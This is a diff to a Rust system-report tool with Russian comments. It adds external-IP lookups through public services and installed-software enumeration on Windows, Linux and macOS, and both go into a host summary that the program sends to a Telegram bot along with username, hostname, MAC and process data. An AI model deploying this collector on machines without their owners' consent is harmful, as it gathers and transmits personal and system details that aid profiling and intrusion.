@@ -83,7 +83,25 @@ struct BaseBoard {
     serial_number: Option<String>,
 }
 
+#[cfg(target_os = "windows")]
+#[derive(Deserialize, Debug)]
+#[serde(rename = "Win32_Product")]
+#[serde(rename_all = "PascalCase")]
+struct InstalledProduct {
+    name: Option<String>,
+    version: Option<String>,
+    vendor: Option<String>,
+    install_date: Option<String>,
+}
+
 // --- Главная структура отчета ---
+
+#[derive(Serialize, Debug, Clone)]
+struct SoftwareInfo {
+    name: String,
+    version: String,
+    vendor: String,
+}
 
 #[derive(Serialize, Debug)]
 struct GPUInfo {
@@ -141,6 +159,7 @@ struct SystemReport {
 
     // Модуль 4: Сеть
     local_ip: String,
+    external_ip: String,
     mac_addresses: HashMap<String, String>,
     network_interfaces: Vec<String>,
 
@@ -163,6 +182,8 @@ struct SystemReport {
     suspicious_drivers: Vec<String>,
     top_memory_processes: Vec<String>,
     top_cpu_processes: Vec<String>,
+    installed_software: Vec<SoftwareInfo>,
+    installed_software_count: usize,
 
     // Метаинформация
     report_generated_at: String,
@@ -189,7 +210,7 @@ async fn main() -> Result<()> {
     }
 
     println!("\n[1/5] Инициализация системных библиотек...");
-    let report = collect_system_info()?;
+    let report = collect_system_info().await?;
 
     println!("[2/5] Сериализация данных в JSON...");
     let filename = save_report(&report)?;
@@ -216,12 +237,14 @@ async fn main() -> Result<()> {
     println!("║ Сетевых интерфейсов: {:>18} ║", report.network_interfaces.len());
     #[cfg(target_os = "windows")]
     println!("║ GPU: {:>34} ║", report.gpus.len());
+    println!("║ Установлено программ: {:>17} ║", report.installed_software_count);
+    println!("║ Внешний IP: {:>27} ║", report.external_ip);
     println!("╚════════════════════════════════════════╝\n");
 
     Ok(())
 }
 
-fn collect_system_info() -> Result<SystemReport> {
+async fn collect_system_info() -> Result<SystemReport> {
     println!("   → Сбор базовой информации...");
     let mut sys = System::new_all();
     sys.refresh_all();
@@ -236,8 +259,9 @@ fn collect_system_info() -> Result<SystemReport> {
     }
 
     println!("   → Сбор информации об оборудовании...");
-    println!("   → Сбор сетевой информации...");
+    println!("   → Сбор сетевой информации (локальный и внешний IP)...");
     println!("   → Анализ процессов...");
+    println!("   → Сбор установленного ПО (это может занять время)...");
 
     let uptime = System::uptime();
     let total_mem = sys.total_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
@@ -279,6 +303,7 @@ fn collect_system_info() -> Result<SystemReport> {
 
         // Модуль 4
         local_ip: get_local_ip(),
+        external_ip: get_external_ip().await.unwrap_or_else(|_| "N/A".to_string()),
         mac_addresses: get_mac_addresses(),
         network_interfaces,
 
@@ -301,6 +326,18 @@ fn collect_system_info() -> Result<SystemReport> {
         suspicious_drivers: find_suspicious_drivers(&wmi_con),
         top_memory_processes: get_top_memory_processes(&sys, 10),
         top_cpu_processes: get_top_cpu_processes(&sys, 10),
+        installed_software: {
+            #[cfg(target_os = "windows")]
+            { get_installed_software_windows(&wmi_con) }
+            #[cfg(not(target_os = "windows"))]
+            { get_installed_software_unix() }
+        },
+        installed_software_count: {
+            #[cfg(target_os = "windows")]
+            { get_installed_software_windows(&wmi_con).len() }
+            #[cfg(not(target_os = "windows"))]
+            { get_installed_software_unix().len() }
+        },
 
         // Метаинформация
         report_generated_at: chrono::Local::now().to_rfc3339(),
@@ -333,17 +370,20 @@ async fn send_to_telegram(filename: &str, report: &SystemReport) -> Result<()> {
         💻 Хост: {}\n\
         👤 Пользователь: {}\n\
         🔧 ОС: {} {}\n\
-        🌐 IP: {}\n\
+        🌐 IP: {} (внешний: {})\n\
         📊 Процессов: {}\n\
         💾 Дисков: {}\n\
+        📦 Установлено ПО: {}\n\
         ⏱️ Uptime: {}",
         report.hostname,
         report.username,
         report.os_name,
         report.os_version,
         report.local_ip,
+        report.external_ip,
         report.process_count,
         report.disks.len(),
+        report.installed_software_count,
         report.system_uptime_readable
     );
 
@@ -587,4 +627,130 @@ fn find_suspicious_drivers(wmi_con: &Option<WMIConnection>) -> Vec<String> {
             })
         })
         .collect()
+}
+
+// --- Новые функции: External IP и Installed Software ---
+
+async fn get_external_ip() -> Result<String> {
+    // Пробуем несколько сервисов для надежности
+    let services = vec![
+        "https://api.ipify.org",
+        "https://ifconfig.me/ip",
+        "https://icanhazip.com",
+    ];
+
+    for service in services {
+        if let Ok(response) = reqwest::get(service).await {
+            if let Ok(ip) = response.text().await {
+                let ip = ip.trim().to_string();
+                if !ip.is_empty() {
+                    return Ok(ip);
+                }
+            }
+        }
+    }
+
+    Err(anyhow::anyhow!("Не удалось получить внешний IP"))
+}
+
+#[cfg(target_os = "windows")]
+fn get_installed_software_windows(wmi_con: &Option<WMIConnection>) -> Vec<SoftwareInfo> {
+    // Win32_Product очень медленный, поэтому используем с лимитом
+    // Альтернативно можно парсить реестр, но это сложнее
+    let products: Vec<InstalledProduct> = get_wmi_data(wmi_con,
+        "SELECT Name, Version, Vendor FROM Win32_Product");
+
+    products.iter()
+        .filter_map(|p| {
+            if let Some(name) = &p.name {
+                Some(SoftwareInfo {
+                    name: name.clone(),
+                    version: p.version.clone().unwrap_or_else(|| "Unknown".to_string()),
+                    vendor: p.vendor.clone().unwrap_or_else(|| "Unknown".to_string()),
+                })
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
+#[cfg(not(target_os = "windows"))]
+fn get_installed_software_unix() -> Vec<SoftwareInfo> {
+    use std::process::Command;
+    let mut software = Vec::new();
+
+    // Пробуем разные package managers
+    #[cfg(target_os = "linux")]
+    {
+        // dpkg (Debian/Ubuntu)
+        if let Ok(output) = Command::new("dpkg")
+            .args(&["-l"])
+            .output()
+        {
+            if output.status.success() {
+                if let Ok(stdout) = String::from_utf8(output.stdout) {
+                    for line in stdout.lines().skip(5) {
+                        let parts: Vec<&str> = line.split_whitespace().collect();
+                        if parts.len() >= 3 && parts[0] == "ii" {
+                            software.push(SoftwareInfo {
+                                name: parts[1].to_string(),
+                                version: parts[2].to_string(),
+                                vendor: "dpkg".to_string(),
+                            });
+                        }
+                    }
+                    return software;
+                }
+            }
+        }
+
+        // rpm (RedHat/CentOS/Fedora)
+        if let Ok(output) = Command::new("rpm")
+            .args(&["-qa", "--queryformat", "%{NAME}|%{VERSION}|%{VENDOR}\\n"])
+            .output()
+        {
+            if output.status.success() {
+                if let Ok(stdout) = String::from_utf8(output.stdout) {
+                    for line in stdout.lines() {
+                        let parts: Vec<&str> = line.split('|').collect();
+                        if parts.len() >= 2 {
+                            software.push(SoftwareInfo {
+                                name: parts[0].to_string(),
+                                version: parts[1].to_string(),
+                                vendor: parts.get(2).unwrap_or(&"Unknown").to_string(),
+                            });
+                        }
+                    }
+                    return software;
+                }
+            }
+        }
+    }
+
+    #[cfg(target_os = "macos")]
+    {
+        // brew для macOS
+        if let Ok(output) = Command::new("brew")
+            .args(&["list", "--versions"])
+            .output()
+        {
+            if output.status.success() {
+                if let Ok(stdout) = String::from_utf8(output.stdout) {
+                    for line in stdout.lines() {
+                        let parts: Vec<&str> = line.split_whitespace().collect();
+                        if parts.len() >= 2 {
+                            software.push(SoftwareInfo {
+                                name: parts[0].to_string(),
+                                version: parts[1].to_string(),
+                                vendor: "Homebrew".to_string(),
+                            });
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    software
 }
